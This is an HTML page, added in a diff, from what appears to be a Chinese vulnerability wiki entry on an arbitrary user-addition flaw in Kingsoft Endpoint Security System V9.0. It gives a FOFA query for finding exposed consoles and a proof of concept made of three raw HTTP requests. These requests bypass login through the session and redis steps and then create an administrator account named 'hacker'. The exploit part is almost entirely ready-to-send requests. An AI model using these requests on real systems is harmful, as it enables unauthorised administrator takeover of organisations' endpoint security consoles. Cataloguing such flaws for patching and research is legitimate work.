@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9FV9.0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>金山终端安全系统V9.0任意用户添加漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u91d1\u5c71\u7ec8\u7aef\u5b89\u5168\u7cfb\u7edfV9.0\u4efb\u610f\u7528\u6237\u6dfb\u52a0\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "fofa", url: "#fofa" },
+              {title: "poc", url: "#poc" },
+              {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_1" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9FV9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9FV9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        金山终端安全系统V9任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9FV9.0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9FV9.0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        金山终端安全系统V9.0 SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="v90">金山终端安全系统V9.0任意用户添加漏洞<a class="headerlink" href="#v90" title="Permanent link">&para;</a></h1>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">title</span><span class="o">==</span><span class="s2">&quot;用户登录-猎鹰终端安全系统V9.0Web控制台&quot;</span><span class="w"> </span>
+<span class="nx">app</span><span class="o">=</span><span class="s2">&quot;金山终端安全系统V9.0Web控制台&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p>首先访问 checklogin.php，设置$_SESSION[‘userName’]。(后续的 Cookie 保持不变)</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">inter</span><span class="o">/</span><span class="nx">ajax</span><span class="p">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">imd</span><span class="o">=</span><span class="nx">checklogin</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">192.168.20.131</span><span class="o">:</span><span class="mf">6868</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="nx">Win64</span><span class="p">;</span><span class="w"> </span><span class="nx">x64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">103.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">103.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span><span class="p">,</span><span class="nx">zh</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="nx">zh</span><span class="o">-</span><span class="nx">TW</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="nx">zh</span><span class="o">-</span><span class="nx">HK</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.3</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.2</span><span class="w"> </span><span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span>
+<span class="nx">X</span><span class="o">-</span><span class="nx">Requested</span><span class="o">-</span><span class="nx">With</span><span class="o">:</span><span class="w"> </span><span class="nx">XMLHttpRequest</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//192.168.20.131:6868</span>
+<span class="nx">Connection</span><span class="o">:</span><span class="w"> </span><span class="nx">close</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//192.168.20.131:6868/</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">SKYLARa0aede9e785feabae789c6e03d</span><span class="o">=</span><span class="nx">v70c2hbb4fnf1mqa1l9f44a964</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">20</span>
+
+<span class="nx">uname</span><span class="o">=</span><span class="nx">login_session_</span>
+</code></pre></div>
+<p><img alt="img" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412301550929.png" /></p>
+<p>接下来访问 send_verify2email.php 在 redis 中添加一个键值对:（mailTo 符合邮箱格式即可）</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">inter</span><span class="o">/</span><span class="nx">ajax</span><span class="p">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">imd</span><span class="o">=</span><span class="nx">send_verify2email</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">192.168.20.131</span><span class="o">:</span><span class="mf">6868</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="nx">Win64</span><span class="p">;</span><span class="w"> </span><span class="nx">x64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">103.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">103.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span><span class="p">,</span><span class="nx">zh</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="nx">zh</span><span class="o">-</span><span class="nx">TW</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="nx">zh</span><span class="o">-</span><span class="nx">HK</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.3</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.2</span><span class="w"> </span><span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span>
+<span class="nx">X</span><span class="o">-</span><span class="nx">Requested</span><span class="o">-</span><span class="nx">With</span><span class="o">:</span><span class="w"> </span><span class="nx">XMLHttpRequest</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//192.168.20.131:6868</span>
+<span class="nx">Connection</span><span class="o">:</span><span class="w"> </span><span class="nx">close</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//192.168.20.131:6868/</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">SKYLARa0aede9e785feabae789c6e03d</span><span class="o">=</span><span class="nx">v70c2hbb4fnf1mqa1l9f44a964</span><span class="w"> </span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">33</span>
+
+<span class="nx">mailTo</span><span class="o">=</span><span class="nx">login_session_</span><span class="err">@</span><span class="nx">qq</span><span class="p">.</span><span class="nx">comEmail</span>
+</code></pre></div>
+<p><img alt="image-20241230155135464" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412301551573.png" /></p>
+<p>面两个步骤访问完成之后，即可未授权访问系统的所有功能，接下来通过权限校验，添加一个系统管理员，访问 get_user_login_cmd 文件即可。(userSession 需要设置成 Email，密码为 1qaz@WSX)</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">inter</span><span class="o">/</span><span class="nx">ajax</span><span class="p">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">cmd</span><span class="o">=</span><span class="nx">get_user_login_cmd</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">192.168.20.131</span><span class="o">:</span><span class="mf">6868</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="nx">Win64</span><span class="p">;</span><span class="w"> </span><span class="nx">x64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">103.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">103.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span><span class="p">,</span><span class="nx">zh</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="nx">zh</span><span class="o">-</span><span class="nx">TW</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="nx">zh</span><span class="o">-</span><span class="nx">HK</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.3</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.2</span><span class="w"> </span><span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span><span class="p">;</span><span class="w"> </span><span class="nx">charset</span><span class="o">=</span><span class="nx">UTF</span><span class="o">-</span><span class="mf">8</span><span class="w"> </span><span class="nx">X</span><span class="o">-</span><span class="nx">Requested</span><span class="o">-</span><span class="nx">With</span><span class="o">:</span><span class="w"> </span><span class="nx">XMLHttpRequest</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">285</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//192.168.20.131:6868</span>
+<span class="nx">Connection</span><span class="o">:</span><span class="w"> </span><span class="nx">close</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//192.168.20.131:6868/</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">SKYLARa0aede9e785feabae789c6e03d</span><span class="o">=</span><span class="nx">v70c2hbb4fnf1mqa1l9f44a964</span>
+
+<span class="p">{</span><span class="s2">&quot;add_user_info_cmd&quot;</span><span class="o">:</span><span class="p">{</span><span class="s2">&quot;userSession&quot;</span><span class="o">:</span><span class="s2">&quot;Email&quot;</span><span class="p">,</span><span class="s2">&quot;mode_id&quot;</span><span class="o">:</span><span class="s2">&quot;B666A8CD-2247-2CA8-4F7D-29EB058A27C2&quot;</span><span class="p">,</span><span class="s2">&quot;real_name&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;user_name&quot;</span><span class="o">:</span><span class="s2">&quot;hacker&quot;</span><span class="p">,</span><span class="s2">&quot;type&quot;</span><span class="o">:</span><span class="s2">&quot;分级管理员&quot;</span><span class="p">,</span><span class="s2">&quot;tel&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;mobile&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;corp&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;notice&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;psw&quot;</span><span class="o">:</span><span class="s2">&quot;92d7ddd2a010c59511dc2905b7e14f64&quot;</span><span class="p">,</span><span class="s2">&quot;email&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;VHierarchyName&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;orgtype&quot;</span><span class="o">:</span><span class="s2">&quot;1&quot;</span><span class="p">}}</span>
+</code></pre></div>
+<p><img alt="img" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412301552673.png" /></p>
+<p><img alt="img" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412301552975.png" /></p>
+<h2 id="_1">漏洞来源<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://xz.aliyun.com/t/16105">https://xz.aliyun.com/t/16105</a></li>
+</ul>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9FV9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9FV9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        金山终端安全系统V9任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9FV9.0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9FV9.0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        金山终端安全系统V9.0 SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
